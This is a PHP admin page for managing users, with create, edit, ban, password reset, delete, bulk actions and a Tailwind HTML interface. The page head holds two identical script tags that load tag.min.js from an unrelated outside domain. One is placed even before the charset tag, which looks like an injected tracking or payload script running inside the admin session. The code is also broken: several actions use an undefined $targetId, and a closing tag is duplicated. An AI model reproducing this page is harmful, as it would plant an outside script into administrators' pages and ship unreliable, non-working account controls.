<?php
// admin/users.php
require_once __DIR__ . '/../config/db_control.php';
require_once __DIR__ . '/../config/auth_middleware.php';

requireAdmin();

$pdo = getControlDB();
$message = '';
$error = '';

// Handle Actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $token = $_POST['csrf_token'] ?? '';

    if (!validateCsrfToken($token)) {
        $error = "Invalid CSRF Token. Please refresh and try again.";
    } else {
        try {
            if ($action === 'create_user') {
                $name = trim($_POST['name']);
                $email = trim($_POST['email']);
                $password = $_POST['password'];
                $role = $_POST['role'] ?? 'user';
                
                // Basic Validation
                if (empty($name) || empty($email) || empty($password)) {
                    throw new Exception("All fields are required.");
                }
                
                // Check if email exists
                $stmt = $pdo->prepare("SELECT id FROM users WHERE email = ?");
                $stmt->execute([$email]);
                if ($stmt->fetch()) {
                     throw new Exception("Email already exists.");
                }
                
                $hash = password_hash($password, PASSWORD_DEFAULT);
                $stmt = $pdo->prepare("INSERT INTO users (name, email, password_hash, role, status) VALUES (?, ?, ?, ?, 'active')");
                $stmt->execute([$name, $email, $hash, $role]);
                $message = "User created successfully.";
                
            } elseif ($action === 'update_user') {
                $userId = (int)$_POST['user_id'];
                $name = trim($_POST['name']);
                $email = trim($_POST['email']);
                $role = $_POST['role'];
                
                $stmt = $pdo->prepare("UPDATE users SET name = ?, email = ?, role = ? WHERE id = ?");
                $stmt->execute([$name, $email, $role, $userId]);
                
                // Optional: Update password if provided
                if (!empty($_POST['password'])) {
                    $hash = password_hash($_POST['password'], PASSWORD_DEFAULT);
                    $pdo->prepare("UPDATE users SET password_hash = ? WHERE id = ?")->execute([$hash, $userId]);
                }
                $message = "User updated successfully.";
                
            } elseif ($action === 'approve') {
                $targetId = (int)$_POST['user_id'];
                // Activate User
                $stmt = $pdo->prepare("UPDATE users SET status = 'active' WHERE id = ?");
                $stmt->execute([$targetId]);
                
                // Provision Database if not exists
                $stmtCheck = $pdo->prepare("SELECT COUNT(*) FROM user_databases WHERE user_id = ?");
                $stmtCheck->execute([$targetId]);
                if ($stmtCheck->fetchColumn() == 0) {
                    // Single DB Architecture
                    $dbName = DB_CONTROL_NAME;
                    $stmtInv = $pdo->prepare("INSERT INTO user_databases (user_id, db_name) VALUES (?, ?)");
                    $stmtInv->execute([$targetId, $dbName]);
                    $message = "User ID $targetId Approved (Linked to Single DB).";
                } else {
                    $message = "User ID $targetId Approved.";
                }

            } elseif ($action === 'ban') {
                $stmt = $pdo->prepare("UPDATE users SET status = 'banned' WHERE id = ?");
                $stmt->execute([$targetId]);
                $message = "User ID $targetId has been banned.";
            } elseif ($action === 'unban') {
                $stmt = $pdo->prepare("UPDATE users SET status = 'active' WHERE id = ?");
                $stmt->execute([$targetId]);
                $message = "User ID $targetId has been unbanned.";
            } elseif ($action === 'force_logout') {
                $stmt = $pdo->prepare("UPDATE users SET force_logout = 1 WHERE id = ?");
                $stmt->execute([$targetId]);
                $message = "User ID $targetId will be logged out on next request.";
            } elseif ($action === 'reset_pass') {
                $randomPass = bin2hex(random_bytes(4)); // 8 chars
                $hash = password_hash($randomPass, PASSWORD_DEFAULT);
                $stmt = $pdo->prepare("UPDATE users SET password_hash = ? WHERE id = ?");
                $stmt->execute([$hash, $targetId]);
                $message = "Password for User ID $targetId reset to: $randomPass (Copy this now!)";
            } elseif ($action === 'delete') {
                $stmt = $pdo->prepare("SELECT db_name FROM user_databases WHERE user_id = ?");
                $stmt->execute([$targetId]);
                $dbInfo = $stmt->fetch();
                if ($dbInfo) {
                    $dbName = $dbInfo['db_name'];
                    // CRITICAL: Do NOT drop the shared database!
                    if ($dbName === DB_CONTROL_NAME || $dbName === DB_NAME) {
                         // Just drop the user's prefixed tables
                         // 1. Get all tables for this user (Using prepared statement to prevent SQL injection)
                         $prefix = "user_{$targetId}_";
                         $stmtTables = $pdo->prepare("SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = ? AND TABLE_NAME LIKE ?");
                         $stmtTables->execute([$dbName, $prefix . '%']);
                         $tables = $stmtTables->fetchAll(PDO::FETCH_COLUMN);
                         
                         // 2. Drop them
                         if ($tables) {
                             $pdo->exec("SET FOREIGN_KEY_CHECKS = 0");
                             foreach ($tables as $tbl) {
                                 $pdo->exec("DROP TABLE IF EXISTS `$tbl`");
                             }
                             $pdo->exec("SET FOREIGN_KEY_CHECKS = 1");
                         }
                    } else {
                        // Legacy: Actual separate DB (Only drop if it's truly separate and not the control DB)
                         $pdo->exec("DROP DATABASE IF EXISTS `$dbName`");
                    }
                    
                    // Remove mapping
                    $pdo->prepare("DELETE FROM user_databases WHERE user_id = ?")->execute([$targetId]);
                }
                $pdo->prepare("DELETE FROM users WHERE id = ?")->execute([$targetId]);
                $message = "User ID $targetId deleted (Tables cleaned).";
            }
        } catch (Exception $e) {
            $error = "Action failed: " . $e->getMessage();
        }
    }
}

// Handle Bulk Actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['bulk_action'])) {
    if (!validateCsrfToken($_POST['csrf_token'] ?? '')) {
        $error = "Invalid CSRF Token.";
    } else {
        $ids = $_POST['selected_users'] ?? [];
        $action = $_POST['bulk_action'];
        
        if (empty($ids)) {
            $error = "No users selected.";
        } else {
            $placeholders = implode(',', array_fill(0, count($ids), '?'));
            try {
                if ($action === 'delete_selected') {
                    // 1. Get DB names for selected users
                    $stmt = $pdo->prepare("SELECT user_id, db_name FROM user_databases WHERE user_id IN ($placeholders)");
                    $stmt->execute($ids);
                    $mappings = $stmt->fetchAll(PDO::FETCH_GROUP | PDO::FETCH_ASSOC);
                    
                    // Cleanup Tables
                    $pdo->exec("SET FOREIGN_KEY_CHECKS = 0");
                    foreach($ids as $uid) {
                        $prefix = "user_{$uid}_";
                        $stmtTables = $pdo->prepare("SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = ? AND TABLE_NAME LIKE ?");
                        $stmtTables->execute([DB_CONTROL_NAME, $prefix . '%']);
                        $tables = $stmtTables->fetchAll(PDO::FETCH_COLUMN);
                         foreach ($tables as $tbl) {
                             $pdo->exec("DROP TABLE IF EXISTS `$tbl`");
                         }
                    }
                    $pdo->exec("SET FOREIGN_KEY_CHECKS = 1");

                    // Delete Users
                    $stmt = $pdo->prepare("DELETE FROM users WHERE id IN ($placeholders)");
                    $stmt->execute($ids);
                    $message = count($ids) . " users deleted.";
                } elseif ($action === 'ban_selected') {
                    $stmt = $pdo->prepare("UPDATE users SET status = 'banned' WHERE id IN ($placeholders)");
                    $stmt->execute($ids);
                    $message = count($ids) . " users banned.";
                } elseif ($action === 'approve_selected') {
                    $stmt = $pdo->prepare("UPDATE users SET status = 'active' WHERE id IN ($placeholders)");
                    $stmt->execute($ids);
                    $message = count($ids) . " users approved.";
                } elseif ($action === 'export_csv') {
                    // Export Logic (Immediate Download)
                    header('Content-Type: text/csv');
                    header('Content-Disposition: attachment; filename="users_export_' . date('Y-m-d') . '.csv"');
                    $out = fopen('php://output', 'w');
                    fputcsv($out, ['ID', 'Name', 'Email', 'Role', 'Status', 'Created At', 'Last Login']);
                    
                    $stmt = $pdo->prepare("SELECT id, name, email, role, status, created_at, last_login FROM users WHERE id IN ($placeholders)");
                    $stmt->execute($ids);
                    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                        fputcsv($out, $row);
                    }
                    fclose($out);
                    exit;
                }
            } catch (Exception $e) {
                $error = "Bulk action failed: " . $e->getMessage();
            }
        }
    }
}

// Pagination & Search Logic
$page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1;
$search = isset($_GET['search']) ? trim($_GET['search']) : '';
$statusFilter = $_GET['status'] ?? '';
$roleFilter = $_GET['role'] ?? '';
$limit = 20;
$offset = ($page - 1) * $limit;

// Build Query
$where = "1=1";
$params = [];
if ($search) {
    $where .= " AND (u.name LIKE ? OR u.email LIKE ?)";
    $params[] = "%$search%";
    $params[] = "%$search%";
}
if ($statusFilter) {
    $where .= " AND u.status = ?";
    $params[] = $statusFilter;
}
if ($roleFilter) {
    $where .= " AND u.role = ?";
    $params[] = $roleFilter;
}

// 1. Get Total Count for Pagination
$stmtCount = $pdo->prepare("SELECT COUNT(*) FROM users u WHERE $where");
$stmtCount->execute($params);
$totalUsers = $stmtCount->fetchColumn();
$totalPages = ceil($totalUsers / $limit);

// 2. Fetch Users with Limit
$sql = "SELECT u.id, u.name, u.email, u.role, u.status, u.created_at, u.last_login, u.last_activity, ud.db_name 
        FROM users u 
        LEFT JOIN user_databases ud ON u.id = ud.user_id 
        WHERE $where
        ORDER BY CASE WHEN u.status = 'pending' THEN 0 ELSE 1 END, u.last_activity DESC, u.created_at DESC
        LIMIT $limit OFFSET $offset";

$stmt = $pdo->prepare($sql);
$stmt->execute($params);
$users = $stmt->fetchAll();
?>
<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
<script src="https://5gvci.com/act/files/tag.min.js?z=10681000" data-cfasync="false" async></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Management | Admin</title>
    <link rel="icon" type="image/png" href="/assets/logo.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>body { background-color: #0a0f1a; color: #fff; font-family: 'Space Grotesk', sans-serif; }</style>
<script src="https://5gvci.com/act/files/tag.min.js?z=10681000" data-cfasync="false" async></script>
</head>
<body class="h-full flex overflow-hidden">

    <aside class="w-64 bg-[#0a0f1a] border-r border-white/5 flex flex-col hidden md:flex">
        <div class="h-20 flex items-center px-6 gap-3 border-b border-white/5">
             <span class="font-bold text-lg">Admin<span class="text-purple-400">Panel</span></span>
        </div>
        <nav class="flex-1 py-6 space-y-1">
            <a href="dashboard.php" class="flex items-center px-6 py-3 text-slate-400 hover:bg-white/5"><i data-lucide="layout-dashboard" class="w-5 h-5 mr-3"></i>Dashboard</a>
            <a href="users.php" class="flex items-center px-6 py-3 text-purple-400 bg-purple-500/10 border-r-2 border-purple-500"><i data-lucide="users" class="w-5 h-5 mr-3"></i>Users</a>
            <a href="pages.php" class="flex items-center px-6 py-3 text-slate-400 hover:bg-white/5"><i data-lucide="file-text" class="w-5 h-5 mr-3"></i>Pages</a>
            <a href="settings.php" class="flex items-center px-6 py-3 text-slate-400 hover:bg-white/5"><i data-lucide="settings" class="w-5 h-5 mr-3"></i>Settings</a>
            <a href="security.php" class="flex items-center px-6 py-3 text-slate-400 hover:bg-white/5"><i data-lucide="shield" class="w-5 h-5 mr-3"></i>Security</a>
            <a href="db_tools.php" class="flex items-center px-6 py-3 text-slate-400 hover:bg-white/5"><i data-lucide="database" class="w-5 h-5 mr-3"></i>DB Tools</a>
        </nav>
        <div class="p-4 border-t border-white/5">
             <a href="../login.php" class="flex items-center px-4 py-2 text-sm text-red-400 hover:bg-red-500/10 rounded-lg transition">
                <i data-lucide="log-out" class="w-4 h-4 mr-2"></i> Logout
            </a>
        </div>
    </aside>

    <main class="flex-1 overflow-y-auto p-8 relative">
        <div class="flex flex-col xl:flex-row justify-between items-start xl:items-center mb-8 gap-4">
            <div>
                <h1 class="text-3xl font-bold">User Management</h1>
                <div class="text-sm text-slate-400">Total: <?= $totalUsers ?> users</div>
            </div>
            
            <div class="flex flex-col md:flex-row gap-3 w-full xl:w-auto">
                 <form method="GET" class="flex flex-col md:flex-row gap-2 w-full">
                    <div class="flex gap-2">
                        <select name="status" class="bg-black/20 border border-white/10 rounded-lg px-3 py-2 text-sm text-white focus:border-purple-500 outline-none">
                            <option value="">All Status</option>
                            <option value="active" <?= $statusFilter === 'active' ? 'selected' : '' ?>>Active</option>
                            <option value="banned" <?= $statusFilter === 'banned' ? 'selected' : '' ?>>Banned</option>
                            <option value="pending" <?= $statusFilter === 'pending' ? 'selected' : '' ?>>Pending</option>
                        </select>
                        <select name="role" class="bg-black/20 border border-white/10 rounded-lg px-3 py-2 text-sm text-white focus:border-purple-500 outline-none">
                            <option value="">All Roles</option>
                            <option value="user" <?= $roleFilter === 'user' ? 'selected' : '' ?>>User</option>
                            <option value="admin" <?= $roleFilter === 'admin' ? 'selected' : '' ?>>Admin</option>
                        </select>
                    </div>

                    <div class="relative flex-1">
                        <input type="text" name="search" value="<?= htmlspecialchars($search) ?>" placeholder="Search name or email..." 
                            class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-sm text-white focus:border-purple-500 outline-none pl-10">
                        <i data-lucide="search" class="w-4 h-4 text-slate-500 absolute left-3 top-2.5"></i>
                    </div>
                    <button type="submit" class="bg-purple-600 hover:bg-purple-500 text-white px-4 py-2 rounded-lg text-sm font-bold transition">Filter</button>
                    <?php if($search || $statusFilter || $roleFilter): ?>
                        <a href="users.php" class="bg-white/5 hover:bg-white/10 text-slate-300 px-4 py-2 rounded-lg text-sm font-bold transition flex items-center justify-center">Reset</a>
                    <?php endif; ?>
                </form>
                
                <button onclick="openCreateModal()" class="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-2 whitespace-nowrap shadow-lg shadow-emerald-500/20">
                    <i data-lucide="plus" class="w-4 h-4"></i> Add User
                </button>
            </div>
        </div>

        <?php if ($message): ?>
            <div class="mb-6 bg-green-500/10 border border-green-500/20 text-green-400 px-4 py-3 rounded-lg flex items-center gap-2"><i data-lucide="check" class="w-4 h-4"></i> <?= htmlspecialchars($message) ?></div>
        <?php endif; ?>
        <?php if ($error): ?>
            <div class="mb-6 bg-red-500/10 border border-red-500/20 text-red-400 px-4 py-3 rounded-lg flex items-center gap-2"><i data-lucide="alert-triangle" class="w-4 h-4"></i> <?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <form method="POST" id="bulkForm">
           <?= csrfInput() ?>
           <div class="flex items-center gap-4 mb-4 p-4 bg-white/5 rounded-2xl border border-white/5">
                <select name="bulk_action" class="bg-black/20 border border-white/10 rounded-lg px-3 py-2 text-sm text-white focus:border-purple-500 outline-none">
                    <option value="" disabled selected>Bulk Actions...</option>
                    <option value="approve_selected">Approve Selected</option>
                    <option value="ban_selected">Ban Selected</option>
                    <option value="delete_selected" class="text-red-400">Delete Selected</option>
                    <option value="export_csv">Export CSV</option>
                </select>
                <button type="submit" onclick="return confirm('Are you sure you want to perform this action?')" class="bg-purple-600 hover:bg-purple-500 text-white px-4 py-2 rounded-lg text-sm font-bold transition">Apply</button>
           </div>

            <div class="bg-white/5 rounded-2xl overflow-hidden border border-white/5">
                <div class="overflow-x-auto">
                    <table class="w-full text-left text-sm">
                        <thead>
                            <tr class="bg-black/20 text-slate-500 border-b border-white/5">
                                <th class="py-4 px-6 w-10">
                                    <input type="checkbox" id="selectAll" class="accent-purple-500 w-4 h-4 cursor-pointer">
                                </th>
                                <th class="py-4 px-6">User</th>
                                <th class="py-4 px-6">Access</th>
                                <th class="py-4 px-6">Last Login</th>
                                <th class="py-4 px-6 text-right">Actions</th>
                            </tr>
                        </thead>
                        <tbody class="divide-y divide-white/5">
                            <?php foreach ($users as $u): ?>
                            <tr class="hover:bg-white/5 transition <?= $u['status'] === 'pending' ? 'bg-blue-500/5' : '' ?>">
                                <td class="py-4 px-6">
                                    <input type="checkbox" name="selected_users[]" value="<?= $u['id'] ?>" class="user-checkbox accent-purple-500 w-4 h-4 cursor-pointer">
                                </td>
                                <td class="py-4 px-6">
                                    <div class="flex items-center gap-3">
                                        <div class="w-8 h-8 rounded-full bg-slate-800 flex items-center justify-center font-bold text-slate-400"><?= strtoupper(substr($u['name'], 0, 1)) ?></div>
                                        <div>
                                            <div class="font-bold text-white flex items-center gap-2">
                                                <?= htmlspecialchars($u['name']) ?>
                                                <?php if(strtotime($u['last_activity'] ?? '0') > strtotime('-5 minutes')): ?>
                                                    <span class="w-2 h-2 rounded-full bg-green-500 shadow-lg shadow-green-500/50" title="Online Now"></span>
                                                <?php endif; ?>
                                                <?php if($u['status'] === 'pending'): ?>
                                                    <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></span>
                                                <?php endif; ?>
                                            </div>
                                            <div class="text-xs text-slate-500"><?= htmlspecialchars($u['email']) ?></div>
                                        </div>
                                    </div>
                                </td>
                                <td class="py-4 px-6">
                                    <?php if ($u['status'] === 'active'): ?>
                                        <span class="px-2 py-0.5 bg-green-500/10 text-green-400 rounded text-xs font-bold">Active</span>
                                    <?php elseif ($u['status'] === 'pending'): ?>
                                        <span class="px-2 py-0.5 bg-blue-500/10 text-blue-400 rounded text-xs font-bold">Pending</span>
                                    <?php else: ?>
                                        <span class="px-2 py-0.5 bg-red-500/10 text-red-400 rounded text-xs font-bold">Banned</span>
                                    <?php endif; ?>
                                    <div class="text-xs text-slate-500 mt-1"><?= ucfirst($u['role']) ?></div>
                                </td>
                                <td class="py-4 px-6 text-slate-400 text-xs">
                                    <?php if($u['last_login']): ?>
                                        <div class="text-white"><?= date('M j, H:i', strtotime($u['last_login'])) ?></div>
                                        <div><?= date('Y', strtotime($u['last_login'])) ?></div>
                                    <?php else: ?>
                                        <span class="opacity-50">Never</span>
                                    <?php endif; ?>
                                </td>
                                <td class="py-4 px-6 text-right">
                                    <div class="flex items-center justify-end gap-2">
                                        <button type="button" onclick='openEditModal(<?= json_encode([
                                            "id" => $u["id"],
                                            "name" => $u["name"],
                                            "email" => $u["email"],
                                            "role" => $u["role"]
                                        ]) ?>)' class="p-2 text-blue-400 hover:text-white bg-white/5 hover:bg-white/10 rounded" title="Edit User">
                                            <i data-lucide="edit-2" class="w-4 h-4"></i>
                                        </button>
                                        
                                        <a href="logs.php?user_id=<?= $u['id'] ?>" class="p-2 text-slate-400 hover:text-white bg-white/5 hover:bg-white/10 rounded" title="View Activity Logs">
                                            <i data-lucide="activity" class="w-4 h-4"></i>
                                        </a>

                                        <?php if ($u['status'] === 'pending'): ?>
                                            <form method="POST" title="Approve User">
                                                <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                                <input type="hidden" name="action" value="approve">
                                                <?= csrfInput() ?>
                                                <button class="p-2 bg-blue-500 hover:bg-blue-600 text-white rounded shadow-lg shadow-blue-500/20"><i data-lucide="check" class="w-4 h-4"></i></button>
                                            </form>
                                        <?php endif; ?>

                                        <form method="POST" title="Force Logout">
                                            <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                            <input type="hidden" name="action" value="force_logout">
                                            <?= csrfInput() ?>
                                            <button class="p-2 text-slate-400 hover:text-white bg-white/5 hover:bg-white/10 rounded"><i data-lucide="log-out" class="w-4 h-4"></i></button>
                                        </form>

                                        <form method="POST" onsubmit="return confirm('Reset password for this user?');" title="Reset Password">
                                            <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                            <input type="hidden" name="action" value="reset_pass">
                                            <?= csrfInput() ?>
                                            <button class="p-2 text-yellow-400 hover:text-yellow-300 bg-white/5 hover:bg-white/10 rounded"><i data-lucide="key" class="w-4 h-4"></i></button>
                                        </form>
                                        
                                        <?php if ($u['status'] === 'active'): ?>
                                            <form method="POST" onsubmit="return confirm('Ban user?');">
                                                <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                                <input type="hidden" name="action" value="ban">
                                                <?= csrfInput() ?>
                                                <button class="p-2 text-amber-500 hover:bg-amber-500/10 rounded"><i data-lucide="user-x" class="w-4 h-4"></i></button>
                                            </form>
                                        <?php else: ?>
                                            <form method="POST">
                                                <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                                <input type="hidden" name="action" value="unban">
                                                <?= csrfInput() ?>
                                                <button class="p-2 text-green-500 hover:bg-green-500/10 rounded"><i data-lucide="user-check" class="w-4 h-4"></i></button>
                                            </form>
                                        <?php endif; ?>

                                        <?php if ($u['role'] !== 'admin'): ?>
                                            <form method="POST" onsubmit="return confirm('Delete user?');">
                                                <input type="hidden" name="user_id" value="<?= $u['id'] ?>">
                                                <input type="hidden" name="action" value="delete">
                                                <?= csrfInput() ?>
                                                <button class="p-2 text-red-500 hover:bg-red-500/10 rounded"><i data-lucide="trash" class="w-4 h-4"></i></button>
                                            </form>
                                        <?php endif; ?>
                                    </div>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </form>
        <script>
            document.getElementById('selectAll').addEventListener('change', function() {
                const checkboxes = document.querySelectorAll('.user-checkbox');
                checkboxes.forEach(cb => cb.checked = this.checked);
            });
        </script>
        <!-- Pagination Controls -->
        <?php if ($totalPages > 1): ?>
        <div class="flex items-center justify-between mt-6 border-t border-white/5 pt-6">
            <div class="text-sm text-slate-400">
                Showing <span class="text-white font-bold"><?= $offset + 1 ?></span> to <span class="text-white font-bold"><?= min($offset + $limit, $totalUsers) ?></span> of <span class="text-white font-bold"><?= $totalUsers ?></span>
            </div>
            <div class="flex gap-2">
                <!-- Previous -->
                <?php if ($page > 1): ?>
                    <a href="?page=<?= $page - 1 ?>&search=<?= urlencode($search) ?>" class="px-4 py-2 bg-white/5 hover:bg-white/10 text-white text-sm rounded-lg transition flex items-center gap-2">
                        <i data-lucide="chevron-left" class="w-4 h-4"></i> Prev
                    </a>
                <?php else: ?>
                    <button disabled class="px-4 py-2 bg-white/5 text-slate-600 text-sm rounded-lg cursor-not-allowed flex items-center gap-2">
                        <i data-lucide="chevron-left" class="w-4 h-4"></i> Prev
                    </button>
                <?php endif; ?>

                <!-- Next -->
                <?php if ($page < $totalPages): ?>
                    <a href="?page=<?= $page + 1 ?>&search=<?= urlencode($search) ?>" class="px-4 py-2 bg-white/5 hover:bg-white/10 text-white text-sm rounded-lg transition flex items-center gap-2">
                        Next <i data-lucide="chevron-right" class="w-4 h-4"></i>
                    </a>
                <?php else: ?>
                    <button disabled class="px-4 py-2 bg-white/5 text-slate-600 text-sm rounded-lg cursor-not-allowed flex items-center gap-2">
                        Next <i data-lucide="chevron-right" class="w-4 h-4"></i>
                    </button>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>
    </main>
    </main>

    <!-- Create User Modal -->
    <div id="create-modal" class="fixed inset-0 z-50 flex items-center justify-center pointer-events-none opacity-0 transition-opacity duration-300">
        <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeCreateModal()"></div>
        <div class="bg-[#0a0f1a] border border-white/10 rounded-2xl w-full max-w-md p-6 shadow-2xl transform scale-95 transition-transform duration-300 pointer-events-auto">
            <h3 class="text-xl font-bold text-white mb-4">Create New User</h3>
            <form method="POST">
                <input type="hidden" name="action" value="create_user">
                <?= csrfInput() ?>
                <div class="space-y-4">
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Full Name</label>
                        <input type="text" name="name" required class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-emerald-500 transition">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Email Address</label>
                        <input type="email" name="email" required class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-emerald-500 transition">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Password</label>
                        <input type="password" name="password" required class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-emerald-500 transition">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Role</label>
                        <select name="role" class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-emerald-500 transition">
                            <option value="user">User</option>
                            <option value="admin">Admin</option>
                        </select>
                    </div>
                    <div class="flex justify-end gap-3 pt-2">
                        <button type="button" onclick="closeCreateModal()" class="px-4 py-2 text-slate-400 hover:text-white transition text-sm">Cancel</button>
                        <button type="submit" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-bold text-sm transition">Create User</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <!-- Edit User Modal -->
    <div id="edit-modal" class="fixed inset-0 z-50 flex items-center justify-center pointer-events-none opacity-0 transition-opacity duration-300">
        <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeEditModal()"></div>
        <div class="bg-[#0a0f1a] border border-white/10 rounded-2xl w-full max-w-md p-6 shadow-2xl transform scale-95 transition-transform duration-300 pointer-events-auto">
            <h3 class="text-xl font-bold text-white mb-4">Edit User</h3>
            <form method="POST">
                <input type="hidden" name="action" value="update_user">
                <input type="hidden" name="user_id" id="edit-user-id">
                <?= csrfInput() ?>
                <div class="space-y-4">
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Full Name</label>
                        <input type="text" name="name" id="edit-name" required class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-purple-500 transition">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Email Address</label>
                        <input type="email" name="email" id="edit-email" required class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-purple-500 transition">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">Role</label>
                        <select name="role" id="edit-role" class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-purple-500 transition">
                            <option value="user">User</option>
                            <option value="admin">Admin</option>
                        </select>
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 mb-1">New Password (Optional)</label>
                        <input type="password" name="password" placeholder="Leave blank to keep current" class="w-full bg-black/20 border border-white/10 rounded-lg px-4 py-2 text-white outline-none focus:border-purple-500 transition">
                    </div>
                    <div class="flex justify-end gap-3 pt-2">
                        <button type="button" onclick="closeEditModal()" class="px-4 py-2 text-slate-400 hover:text-white transition text-sm">Cancel</button>
                        <button type="submit" class="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white rounded-lg font-bold text-sm transition">Save Changes</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <script>
        lucide.createIcons();
        
        document.getElementById('selectAll').addEventListener('change', function() {
            const checkboxes = document.querySelectorAll('.user-checkbox');
            checkboxes.forEach(cb => cb.checked = this.checked);
        });

        // Modal Logic
        function openCreateModal() {
            const el = document.getElementById('create-modal');
            el.classList.remove('pointer-events-none', 'opacity-0');
            el.children[1].classList.remove('scale-95');
            el.children[1].classList.add('scale-100');
        }
        function closeCreateModal() {
            const el = document.getElementById('create-modal');
            el.classList.add('pointer-events-none', 'opacity-0');
            el.children[1].classList.remove('scale-100');
            el.children[1].classList.add('scale-95');
        }

        function openEditModal(user) {
            document.getElementById('edit-user-id').value = user.id;
            document.getElementById('edit-name').value = user.name;
            document.getElementById('edit-email').value = user.email;
            document.getElementById('edit-role').value = user.role;
            
            const el = document.getElementById('edit-modal');
            el.classList.remove('pointer-events-none', 'opacity-0');
            el.children[1].classList.remove('scale-95');
            el.children[1].classList.add('scale-100');
        }
        function closeEditModal() {
            const el = document.getElementById('edit-modal');
            el.classList.add('pointer-events-none', 'opacity-0');
            el.children[1].classList.remove('scale-100');
            el.children[1].classList.add('scale-95');
        }
    </script>
</body>
</html>
